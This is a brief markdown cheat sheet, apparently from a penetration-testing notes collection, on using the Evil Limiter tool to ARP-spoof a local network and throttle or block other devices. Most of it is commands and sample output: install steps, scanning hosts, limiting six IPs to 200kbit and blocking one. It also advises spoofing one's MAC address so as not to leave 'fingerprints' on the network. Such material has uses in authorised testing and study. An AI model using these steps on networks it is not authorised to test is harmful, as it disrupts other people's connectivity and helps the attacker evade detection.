# Control Network Traffic with Evil Limiter to Throttle or Kick Off Devices 

> One thing to keep in mind when using Evil Limiter is that **ARP spoofing exposes your MAC address, so using this tool on a network is effectively telling everyone that your MAC address is the router.** 
- That leaves your MAC address in the ARP cache of every machine you're targeting, so make sure to **spoof your MAC address before using this tool** if you don't want to be leaving your machine's fingerprints all over the network.

```bash
    # Install Evil Limiter
    git clone https://github.com/bitbrute/evillimiter.git
    cd evillimiter
    sudo python3 setup.py install

    # Run Evillimiter
    sudo evillimiter

    # Discover Devices
    (Main) >>> scan
    (Main) >>> hosts

    # Limit or Block Devices, 1,2,3,4,5 ids in host list 
    (Main) >>> limit 1,2,3,4,5,6 200kbit

    OK   192.168.5.2 limited to 200kbit.
    OK   192.168.5.4 limited to 200kbit.
    OK   192.168.5.24 limited to 200kbit.
    OK   192.168.5.25 limited to 200kbit.
    OK   192.168.5.61 limited to 200kbit.
    OK   192.168.5.67 limited to 200kbit.

    # To Block
    (Main) >>> block 3

    # Restore Normal Connection
    (Main) >>> free all

```

## References
- [Nullbyte - Control Network Traffic with Evil Limiter to Throttle or Kick Off Devices](https://null-byte.wonderhowto.com/how-to/control-network-traffic-with-evil-limiter-throttle-kick-off-devices-0196137/)